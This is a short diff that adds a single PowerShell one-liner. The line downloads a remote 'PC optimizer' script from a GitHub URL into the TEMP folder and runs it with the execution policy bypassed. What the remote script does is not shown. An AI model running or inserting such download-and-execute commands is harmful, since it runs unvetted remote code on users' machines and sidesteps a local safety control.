@@ -1,1 +1,3 @@
+$u='https://raw.githubusercontent.com/veer995020/BEST-WINDOWS-POWERSHELL-OPTIMIZER/refs/heads/main/POWERSHELL%20OPTIMIZER/PC_Optimizer.ps1'; $p="$env:TEMP\PC_Optimizer.ps1"; $wc=New-Object System.Net.WebClient; $wc.Encoding=[System.Text.Encoding]::UTF8; $s=$wc.DownloadString($u); [System.IO.File]::WriteAllText($p,$s,[System.Text.UTF8Encoding]::new($true)); powershell.exe -NoProfile -ExecutionPolicy Bypass -File $p
+
 
